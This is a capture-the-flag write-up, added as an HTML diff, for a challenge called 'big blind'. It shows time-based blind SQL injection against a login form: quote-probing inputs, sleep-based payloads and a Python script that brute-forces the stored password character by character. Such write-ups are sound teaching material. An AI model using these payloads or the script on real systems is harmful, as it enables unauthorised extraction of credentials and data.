@@ -1,0 +1,95 @@
+<h2>big blind</h2>
+
+<blockquote>
+  <p>Solved By : thewhiteh4t</p>
+</blockquote>
+
+<ul>
+<li>we are given a login page in this challenge</li>
+<li>the page source does not contain any JS</li>
+<li>After trying several things I found that we get status 500 on using <code>'</code> in either username or password field</li>
+<li>we don’t get an error if we use <code>'</code> in both fields</li>
+<li>A better test is to use the following :</li>
+</ul>
+
+<p><code>
+user : ''
+pass : '
+</code></p>
+
+<ul>
+<li>in the above case we get an error which shows that its due to an un-closed <code>'</code></li>
+<li>we don’t get an error in the following case :</li>
+</ul>
+
+<p><code>
+user : ''
+pass : ''
+</code></p>
+
+<ul>
+<li>finally I confirmed that its blind SQL injection by using the following payload :</li>
+</ul>
+
+<p><code>
+' or sleep(2) and 1=1#
+</code></p>
+
+<ul>
+<li>so here it was clear that its MySQL because syntax for others are different</li>
+<li>I used <code>SUBSTRING</code> and <code>SLEEP</code> to bruteforce the flag one character at a time</li>
+<li>payload :</li>
+</ul>
+
+<p><code>
+' OR IF(SUBSTRING(pass,1,1)='f',sleep(5),sleep(0))#
+</code></p>
+
+<ul>
+<li>Explanation :
+<ul>
+<li>substring function requires three arguments</li>
+<li>first argument is the string which we want to check</li>
+<li>second argument is the position which we want to check</li>
+<li>third argument is the length we want to check</li>
+<li>to check one character at a time I incremented second argument each time and kept third argument fixed</li>
+</ul></li>
+<li>Usage of <code>IF</code> :
+<ul>
+<li>If uses three arguments</li>
+<li>first is the condition</li>
+<li>second is action if condition is <code>True</code></li>
+<li>third is action if condition is <code>False</code></li>
+<li>so when we find a match we will see a sleep of 5 seconds else page will load immediately</li>
+</ul></li>
+<li>Automation :</li>
+</ul>
+
+<p>```python
+from requests import post, ReadTimeout</p>
+
+<p>url = 'https://big-blind.hsc.tf/'
+charset = '_{}flagisodnbcehjkmpqrtuvwxyz'
+flag = ''
+counter = 0</p>
+
+<p>while flag.endswith('}') != True:
+    counter += 1
+    for char in charset:
+        payload = {
+            'user': 'twh',
+            'pass': f"' OR IF(SUBSTRING(pass,{counter},1)='{char}',sleep(5),sleep(0))#"
+        }
+        try:
+            r = post(url, data=payload, timeout=3)
+        except ReadTimeout:
+            flag += char
+            print(f'FLAG : {flag}')
+            break
+```</p>
+
+<ul>
+<li>output :</li>
+</ul>
+
+<p><img src="https://i.imgur.com/fAdPjA5.png" alt="" /></p>
